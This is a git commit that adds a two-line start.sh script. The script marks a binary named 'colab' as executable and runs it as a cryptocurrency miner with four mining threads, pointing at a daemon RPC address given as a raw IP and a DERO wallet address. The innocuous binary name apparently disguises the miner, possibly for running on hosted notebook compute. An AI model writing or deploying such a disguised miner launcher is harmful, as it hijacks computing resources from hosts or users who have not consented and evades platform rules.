60d17ad253abca4e9650b98e4412c577c7bc3e61
husanaah76 <husanaah76@gmail.com>
2024-10-14 22:18:10 +0800

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,2 @@
+chmod +x colab
+./colab --mining-threads 4 --daemon-rpc-address 139.59.242.71:10100 --wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe5h3ascl66u7jstaklpe
